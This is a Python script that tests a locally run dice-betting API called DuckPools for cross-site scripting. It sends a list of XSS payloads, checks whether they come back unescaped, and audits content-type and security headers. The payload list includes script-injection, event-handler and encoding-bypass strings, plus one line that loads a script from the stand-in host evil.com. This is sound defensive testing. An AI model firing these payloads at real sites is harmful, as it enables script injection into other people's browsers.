#!/usr/bin/env python3
"""
XSS Vulnerability Testing Script

Tests various XSS vectors against the DuckPools API to verify
that inputs are properly sanitized and XSS attacks are prevented.
"""

import httpx
import json
from typing import Dict, Any

BASE_URL = "http://localhost:8000"

# XSS test vectors
XSS_VECTORS = [
    # Basic script injection
    "<script>alert('XSS')</script>",
    
    # Various script tag variations
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<script src=http://evil.com/xss.js></script>",
    "<img src=x onerror=alert('XSS')>",
    
    # HTML event handlers
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    
    # Encoding bypass attempts
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    
    # JavaScript in other contexts
    "javascript:alert('XSS')",
    "';alert('XSS');//",
    "\";alert('XSS');//",
    
    # Null byte injection
    "<scr\x00ipt>alert('XSS')</scr\x00ipt>",
    
    # Alternative script tags
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    
    # CSS expression
    "<style>body{background:expression(alert('XSS'))}</style>",
]

def test_xss_in_address():
    """Test XSS vectors in bet_address parameter."""
    print("Testing XSS vectors in bet_address parameter...")
    print("=" * 70)
    
    vulnerable = False
    
    for i, xss_payload in enumerate(XSS_VECTORS, 1):
        print(f"\nTest {i:2d}: {xss_payload[:50]}{'...' if len(xss_payload) > 50 else ''}")
        
        payload = {
            "bet_address": xss_payload,
            "amount": 1000000,
            "player_address": "3WyrB3D5AMpyEc88UJ7FpdsBMXAZKwzQzkKeDbAQVfXytDPgxF26"
        }
        
        try:
            response = httpx.post(f"{BASE_URL}/api/dice/bet", json=payload, timeout=10)
            
            # Check if response contains the unescaped XSS payload
            response_text = response.text
            
            if xss_payload in response_text:
                print(f"  ❌ VULNERABLE: XSS payload reflected in response")
                vulnerable = True
            else:
                print(f"  ✅ OK: XSS payload not found in response")
                
            # Check if response properly escapes HTML entities
            if "&lt;" in response_text and "script" in response_text:
                print(f"  ✅ OK: HTML entities properly escaped")
            
        except Exception as e:
            print(f"  ❓ ERROR: {e}")
    
    return vulnerable

def test_xss_in_query_params():
    """Test XSS vectors in URL query parameters."""
    print("\n\nTesting XSS vectors in URL query parameters...")
    print("=" * 70)
    
    vulnerable = False
    
    for i, xss_payload in enumerate(XSS_VECTORS[:5], 1):  # Test first 5 vectors
        print(f"\nTest {i}: {xss_payload[:30]}{'...' if len(xss_payload) > 30 else ''}")
        
        try:
            # Test with query parameter
            response = httpx.get(f"{BASE_URL}/health?xss_test={xss_payload}", timeout=10)
            response_text = response.text
            
            if xss_payload in response_text:
                print(f"  ❌ VULNERABLE: XSS payload reflected in response")
                vulnerable = True
            else:
                print(f"  ✅ OK: XSS payload not found in response")
                
        except Exception as e:
            print(f"  ❓ ERROR: {e}")
    
    return vulnerable

def test_content_type_header():
    """Test that JSON responses have proper content-type header."""
    print("\n\nTesting Content-Type header for JSON responses...")
    print("=" * 70)
    
    endpoints_to_test = [
        "/health",
        "/pool/state",
        "/scripts",
        "/"
    ]
    
    issues = []
    
    for endpoint in endpoints_to_test:
        try:
            response = httpx.get(f"{BASE_URL}{endpoint}", timeout=10)
            content_type = response.headers.get("content-type", "").lower()
            
            print(f"\nEndpoint: {endpoint}")
            print(f"  Content-Type: {content_type}")
            
            if "application/json" not in content_type:
                print(f"  ❌ ISSUE: Not serving JSON with proper content-type")
                issues.append(f"{endpoint}: {content_type}")
            else:
                print(f"  ✅ OK: Proper JSON content-type")
                
        except Exception as e:
            print(f"  ❓ ERROR: {e}")
    
    return len(issues) > 0, issues

def check_security_headers():
    """Verify that all security headers are present."""
    print("\n\nChecking security headers...")
    print("=" * 70)
    
    required_headers = {
        "X-Frame-Options": "Clickjacking protection",
        "X-Content-Type-Options": "MIME-sniffing protection",
        "X-XSS-Protection": "XSS filter",
        "Referrer-Policy": "Referer header leakage",
        "Permissions-Policy": "Browser feature restrictions",
        "Content-Security-Policy": "Content injection protection",
        "Strict-Transport-Security": "Force HTTPS",
    }
    
    try:
        response = httpx.get(f"{BASE_URL}/health", timeout=10)
        
        missing = []
        present = []
        
        for header, description in required_headers.items():
            if header in response.headers:
                value = response.headers[header][:50] + "..." if len(response.headers[header]) > 50 else response.headers[header]
                print(f"  ✓ {header}: {value}")
                present.append(header)
            else:
                print(f"  ✗ {header}: MISSING ({description})")
                missing.append(header)
        
        return missing, present
        
    except Exception as e:
        print(f"  ❓ ERROR: {e}")
        return list(required_headers.keys()), []

def main():
    print("XSS Vulnerability Testing for DuckPools API")
    print("WARNING: Run only against authorized test environments!")
    print("=" * 80)
    
    vulnerabilities = []
    
    # Test XSS in address parameter
    xss_in_address_vulnerable = test_xss_in_address()
    if xss_in_address_vulnerable:
        vulnerabilities.append("XSS in bet_address parameter")
    
    # Test XSS in query parameters
    xss_in_query_vulnerable = test_xss_in_query_params()
    if xss_in_query_vulnerable:
        vulnerabilities.append("XSS in query parameters")
    
    # Test content-type headers
    content_type_issues, issues = test_content_type_header()
    if content_type_issues:
        vulnerabilities.append(f"Content-Type issues: {issues}")
    
    # Check security headers
    required_headers = {
        "X-Frame-Options": "Clickjacking protection",
        "X-Content-Type-Options": "MIME-sniffing protection",
        "X-XSS-Protection": "XSS filter",
        "Referrer-Policy": "Referer header leakage",
        "Permissions-Policy": "Browser feature restrictions",
        "Content-Security-Policy": "Content injection protection",
        "Strict-Transport-Security": "Force HTTPS",
    }
    
    missing_headers, present_headers = check_security_headers()
    if missing_headers:
        vulnerabilities.append(f"Missing security headers: {missing_headers}")
    
    # Summary
    print("\n\n" + "=" * 80)
    print("XSS TEST SUMMARY")
    print("=" * 80)
    
    if vulnerabilities:
        print(f"\n❌ VULNERABILITIES FOUND:")
        for vuln in vulnerabilities:
            print(f"  - {vuln}")
        print(f"\nTotal issues: {len(vulnerabilities)}")
    else:
        print(f"\n✅ NO XSS VULNERABILITIES DETECTED")
        print(f"  - All XSS vectors properly handled")
        print(f"  - Proper Content-Type headers")
        print(f"  - All security headers present")
    
    print(f"\nSecurity headers present: {len(present_headers)}/{len(required_headers)}")
    
    if missing_headers:
        print(f"\nMissing headers: {', '.join(missing_headers)}")
    
    print("\n" + "=" * 80)

if __name__ == "__main__":
    main()